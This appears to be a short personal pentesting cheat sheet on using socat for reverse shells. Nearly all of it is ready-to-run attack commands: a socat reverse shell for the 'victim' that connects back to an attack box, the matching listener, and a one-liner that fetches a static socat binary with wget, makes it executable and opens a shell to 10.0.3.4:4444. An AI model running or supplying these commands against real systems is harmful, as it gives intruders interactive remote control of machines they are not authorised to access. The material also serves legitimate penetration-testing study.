```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## socat
[socat](https://linux.die.net/man/1/socat) is similar to netcat but offers some additional features, like port forwarding to connected serial devices. One particular use is to  [upgrade a shell to a fully interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat). The standalone binary of *socat* can be transferred to a target for a more stable reverse shell connection.

## Create a socat TTY reverse shell
On the victim (with socat installed):
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[atkbox IP]:[port]
```
On attack box, listen with:
```
socat file:`tty`,raw,echo=0 tcp-listen:[port]
```

## Install socat, chmod it, exec TTY reverse shell
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
1. This downloads socat from : [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries) to a writable directory
2. Chmod it to be exacutable
3. Then execute the reverse shell